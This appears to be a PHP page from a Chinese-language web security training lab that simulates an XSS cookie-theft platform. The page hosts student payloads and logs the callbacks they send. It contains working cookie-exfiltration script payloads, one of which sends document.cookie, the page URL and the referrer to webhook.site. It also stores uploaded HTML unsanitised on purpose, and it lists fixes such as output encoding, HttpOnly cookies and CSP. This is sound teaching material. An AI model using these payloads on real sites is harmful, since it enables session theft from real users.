<?php
/**
 * bafanglab - 模块6e：XSS 平台（payload 托管与回连收信模拟）
 * 版权所有：八方网域-无涯
 *
 * 靶场设计说明：
 * 1. 学员把 payload 提交到本页，等价于「托管到 XSS 平台」，文件保存在 uploads/xss/platform/；
 * 2. 打开托管地址即模拟「受害者访问」，payload 会向本页的收信地址回连；
 * 3. 收信地址把回连参数写入同一目录的日志文件，页面展示收信记录，用于观察 cookie 外带过程。
 * 注意：本页只做教学模拟，不连接任何真实第三方平台。
 */
require_once dirname(dirname(__DIR__)) . '/includes/i18n.php';

// 与上传型 XSS 相同的演示 cookie，供 payload 读取 document.cookie
if (!isset($_COOKIE['xss_upload_pass'])) {
    setcookie('xss_upload_pass', '恭喜你完成本关挑战！', time() + 86400,
        (BASE_URL === '' ? '/' : BASE_URL . '/'));
}

$page_title = 'XSS 平台';
require_once dirname(dirname(__DIR__)) . '/includes/header.php';

$p_dir = UPLOAD_DIR . DIRECTORY_SEPARATOR . 'xss' . DIRECTORY_SEPARATOR . 'platform';
if (!is_dir($p_dir)) { @mkdir($p_dir, 0777, true); }

// 本次演练的 token：优先使用页面传入值，其次 cookie，最后随机生成
$token = isset($_GET['t']) ? preg_replace('/[^a-f0-9]/', '', (string)$_GET['t']) : '';
if ($token === '') {
    $token = isset($_COOKIE['xss_platform_token']) ? preg_replace('/[^a-f0-9]/', '', (string)$_COOKIE['xss_platform_token']) : '';
}
if ($token === '') { $token = substr(bin2hex(random_bytes(8)), 0, 12); }
setcookie('xss_platform_token', $token, time() + 86400, (BASE_URL === '' ? '/' : BASE_URL . '/'));

$payloadFile = $p_dir . DIRECTORY_SEPARATOR . $token . '.html';
$logFile = $p_dir . DIRECTORY_SEPARATOR . $token . '.log';
$rxUrl = BASE_URL . '/modules/xss/platform.php?rx=' . $token;

// 收信端：payload 回连时携带 c=...，写入日志后返回纯文本
if (isset($_GET['rx'])) {
    $rx = preg_replace('/[^a-f0-9]/', '', (string)$_GET['rx']);
    if ($rx !== '' && is_file($p_dir . DIRECTORY_SEPARATOR . $rx . '.html')) {
        $data = isset($_GET['c']) ? (string)$_GET['c'] : '';
        $line = date('Y-m-d H:i:s') . "\t" . str_replace(array("\r", "\n"), '', $data) . "\n";
        @file_put_contents($p_dir . DIRECTORY_SEPARATOR . $rx . '.log', $line, FILE_APPEND);
        header('Content-Type: text/plain; charset=utf-8');
        echo 'ok';
        exit;
    }
}

$msg = '';

// 清理本次演练数据（托管文件 + 收信日志）
if (isset($_GET['del'])) {
    foreach (array($payloadFile, $logFile) as $f) {
        if (is_file($f)) { @unlink($f); }
    }
    header('Location: ' . BASE_URL . '/modules/xss/platform.php?t=' . $token);
    exit;
}

// 托管 payload（等价于上传到 XSS 平台）
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['payload'])) {
    $payload = (string)$_POST['payload'];
    if ($payload === '') {
        $msg = '<div class="msg fail">' . 'payload 不能为空。' . '</div>';
    } elseif (@file_put_contents($payloadFile, $payload) === false) {
        $msg = '<div class="msg fail">' . '托管失败，请检查 uploads/xss/platform 目录权限。' . '</div>';
    } else {
        $msg = '<div class="msg success">' . '托管成功！打开下面的地址即模拟受害者访问：'
            . '<a href="' . htmlspecialchars(BASE_URL . '/uploads/xss/platform/' . $token . '.html') . '" target="_blank" rel="noopener noreferrer" style="color:var(--success)">'
            . htmlspecialchars(BASE_URL . '/uploads/xss/platform/' . $token . '.html') . '</a></div>';
    }
}

// 默认 payload：读取 cookie 并回连到本页收信地址
$defaultPayload = "<script>new Image().src='" . $rxUrl . "&c='+encodeURIComponent(document.cookie);</script>";

// 读取收信日志（最多显示最近 20 条）
$logs = array();
if (is_file($logFile)) {
    $lines = @file($logFile);
    if (is_array($lines)) {
        $logs = array_slice($lines, -20);
    }
}
$gotFlag = false;
foreach ($logs as $line) {
    if (strpos($line, '恭喜你完成本关挑战') !== false) { $gotFlag = true; }
}
$hostedUrl = BASE_URL . '/uploads/xss/platform/' . $token . '.html';
?>
<a class="back-link" href="<?php echo BASE_URL; ?>/index.php">&larr; <?php echo t('footer.back'); ?></a>

<div class="panel">
    <h2><?php echo '模块6：XSS 跨站脚本'; ?></h2>
    <?php xss_tabs('tab.xss_platform'); ?>
    <?php level_tools('basic', 'hint', false, true, 'tools', BASE_URL . '/modules/xss/case.php'); ?>
    <?php
    level_code(false, array(), <<<'FIX'
// 修复1：输出编码——按输出上下文使用 htmlspecialchars / json_encode，不用黑名单替换
echo '<td>' . htmlspecialchars($nickname, ENT_QUOTES, 'UTF-8') . '</td>';

// 修复2：会话 cookie 加 HttpOnly + SameSite，XSS 无法读取 cookie
setcookie('SESSIONID', $sid, array(
    'httponly' => true,
    'samesite' => 'Lax',
    'secure'   => true,
));

// 修复3：CSP 限制脚本来源，阻断第三方平台托管的 payload
header("Content-Security-Policy: default-src 'self'; script-src 'self'; object-src 'none'");

// 修复4：用户上传的 HTML/SVG 放独立域名，并强制 Content-Disposition: attachment
FIX);
    ?>

    <p class="desc">
        <?php echo '本关以公开收信平台 <a href="https://webhook.site/" target="_blank" rel="noopener noreferrer">webhook.site</a> 为例，演示 XSS 平台的完整流程：
        <b>生成收信地址 → 把 payload 托管/注入到目标 → 受害者浏览器执行脚本并回连 → 在平台面板查看命中记录</b>。'; ?>
    </p>
    <?php level_goal('目标：跑通「生成收信地址 → 托管/回连 → 面板查看命中记录」链路，理解平台在 XSS 利用中的实际作用；需要靶场自动判定通关时，可使用下方的靶内替代收信方案。'); ?>

    <h4><?php echo '第 1 步：用 webhook.site 生成收信地址'; ?></h4>
    <div class="result">
        <ul class="doc-step">
            <li><?php echo '打开 <a href="https://webhook.site/" target="_blank" rel="noopener noreferrer">https://webhook.site/</a>，页面会自动分配一个唯一 URL（形如 <code>https://webhook.site/xxxxxxxx-xxxx-xxxx-xxxx-xxxxxxxxxxxx</code>），这就是本次演练的收信地址，无需注册即可实时查看请求。'; ?></li>
            <li><?php echo '这个地址就是平台回调 URL：受害者浏览器访问它时，webhook.site 会记录一次请求，并实时显示在左侧 Requests 面板。'; ?></li>
            <li><?php echo '匿名地址有过期时间，适合课堂快速演示；需要长期保留可注册后保存地址。'; ?></li>
        </ul>
    </div>

    <h4><?php echo '第 2 步：把 payload 托管/回连到该地址'; ?></h4>
    <div class="result">
        <p><?php echo '把 webhook.site 地址填进 payload，脚本执行时浏览器会向该地址发起一次 GET 请求，把 cookie、页面地址、来源页放进查询参数：'; ?></p>
        <pre>&lt;script&gt;
new Image().src = 'https://webhook.site/你的唯一地址'
  + '?c=' + encodeURIComponent(document.cookie)
  + '&amp;u=' + encodeURIComponent(location.href)
  + '&amp;r=' + encodeURIComponent(document.referrer);
&lt;/script&gt;</pre>
        <p><?php echo '托管方式二选一：① 把 payload 直接注入到前面关卡的反射 / 存储 / DOM 注入点；② 用下方「靶内替代方案」的托管框把 payload 写到 <code>uploads/xss/platform/&lt;token&gt;.html</code>，再打开托管地址模拟受害者访问。'; ?></p>
    </div>

    <h4><?php echo '第 3 步：在 webhook.site 面板查看命中记录'; ?></h4>
    <div class="result">
        <table>
            <tr><th style="width:190px"><?php echo '面板字段'; ?></th><th><?php echo '实际抓取到的信息'; ?></th></tr>
            <tr>
                <td><b><?php echo 'Query String'; ?></b></td>
                <td><?php echo '<code>c</code> 解码后就是 <code>document.cookie</code>（被窃取的会话凭证）；<code>u</code> 是触发脚本的页面地址；<code>r</code> 是来源页地址。'; ?></td>
            </tr>
            <tr>
                <td><b><?php echo 'Source IP'; ?></b></td>
                <td><?php echo '命中请求的来源 IP。浏览器场景下即受害者的出口 IP；盲打场景下是服务器出口 IP，可用于判断内网位置。'; ?></td>
            </tr>
            <tr>
                <td><b><?php echo 'User-Agent'; ?></b></td>
                <td><?php echo '受害者浏览器、操作系统与内核版本，可用于判断是否为真实用户、是否为移动端。'; ?></td>
            </tr>
            <tr>
                <td><b><?php echo 'Referer'; ?></b></td>
                <td><?php echo '触发脚本的页面地址（部分浏览器隐私策略或 Referrer-Policy 会省略该头）。'; ?></td>
            </tr>
            <tr>
                <td><b><?php echo 'Headers'; ?></b></td>
                <td><?php echo '完整请求头，含 <code>Accept</code>、<code>Accept-Language</code> 等。注意 webhook.site 自己域下的 <code>Cookie</code> 头通常为空——被窃的 cookie 在查询参数 <code>c</code> 里，而不是这个 Cookie 头。'; ?></td>
            </tr>
            <tr>
                <td><b><?php echo 'Created'; ?></b></td>
                <td><?php echo '请求命中时间，盲打或存储型 XSS 可据此判断触发延迟。'; ?></td>
            </tr>
        </table>
    </div>

    <h4><?php echo '靶场内可用的替代方案（自建收信，原有功能保留）'; ?></h4>
    <p class="desc">
        <?php echo '不想使用第三方平台时，可以直接用本页自带的收信端：收信地址用 token 区分，托管文件与收信日志都保存在
        <code>uploads/xss/platform/</code>，日志出现通关凭证即自动判定通关。下面的表单与记录会保留全部原有功能。'; ?>
    </p>
    <?php echo $msg; ?>

    <h4><?php echo '替代方案 1：你的靶内收信地址'; ?></h4>
    <div class="result">
        <div><?php echo '收信地址（靶内模拟平台的回调 URL）：'; ?><code id="rxUrl"><?php echo htmlspecialchars($rxUrl); ?></code></div>
        <div><?php echo '本次演练 token：'; ?><code><?php echo htmlspecialchars($token); ?></code></div>
        <div><?php echo '托管后的访问地址：'; ?><code><?php echo htmlspecialchars($hostedUrl); ?></code></div>
    </div>

    <h4><?php echo '替代方案 2：托管 payload 到靶场'; ?></h4>
    <form method="post" action="<?php echo BASE_URL; ?>/modules/xss/platform.php?t=<?php echo rawurlencode($token); ?>">
        <div class="form-row">
            <label><?php echo 'payload（托管到 uploads/xss/platform/，默认回连靶内收信地址）'; ?></label>
            <textarea name="payload" style="width:100%;max-width:900px;height:110px;font-family:var(--font-mono)"><?php echo htmlspecialchars(isset($_POST['payload']) ? (string)$_POST['payload'] : $defaultPayload); ?></textarea>
        </div>
        <button class="btn" type="submit"><?php echo '托管 payload'; ?></button>
        <a class="btn btn-plain btn-sm" href="<?php echo BASE_URL; ?>/modules/xss/platform.php?del=1&amp;t=<?php echo rawurlencode($token); ?>"><?php echo '清理本次演练数据'; ?></a>
    </form>

    <h4><?php echo '替代方案 3：模拟受害者访问并查看靶内收信'; ?></h4>
    <div class="result">
        <?php if (is_file($payloadFile)): ?>
            <div><a class="btn btn-plain btn-sm" href="<?php echo htmlspecialchars($hostedUrl); ?>" target="_blank" rel="noopener noreferrer"><?php echo '打开托管地址（模拟受害者访问）'; ?></a></div>
        <?php else: ?>
            <div><?php echo '还没有托管 payload，完成替代方案 2 后会生成访问地址。'; ?></div>
        <?php endif; ?>
    </div>

    <h4><?php echo '靶内收信记录'; ?></h4>
    <div class="result<?php echo $gotFlag ? ' success' : ''; ?>">
        <?php if ($gotFlag): ?>
            <div><b style="color:var(--success)">通关成功：平台已收到 cookie 中的通关凭证！</b></div>
        <?php endif; ?>
        <?php if (empty($logs)): ?>
            <div><?php echo '暂无收信记录。托管 payload 并打开访问地址后，这里会显示回连时间与携带的数据。'; ?></div>
        <?php else: ?>
            <table>
                <tr><th style="width:180px"><?php echo '时间'; ?></th><th><?php echo '收到的数据（c 参数）'; ?></th></tr>
                <?php foreach ($logs as $line): ?>
                    <?php $parts = explode("\t", rtrim($line, "\r\n"), 2); ?>
                    <tr>
                        <td><?php echo htmlspecialchars($parts[0]); ?></td>
                        <td><code><?php echo htmlspecialchars(isset($parts[1]) ? $parts[1] : ''); ?></code></td>
                    </tr>
                <?php endforeach; ?>
            </table>
        <?php endif; ?>
    </div>

    <div class="doc-note">
        <?php echo '说明：真实 XSS 平台还会提供长短链接、payload 加密、键盘记录、会话维持与多受害者管理；
        本页的靶内收信端只模拟「托管 + 回连 + 收信」这条最核心的链路，托管文件与收信日志都写在 uploads/xss/platform/ 下，可随时清理。'; ?>
    </div>
</div>

<?php level_nav_current(); ?>

<?php require_once dirname(dirname(__DIR__)) . '/includes/footer.php'; ?>
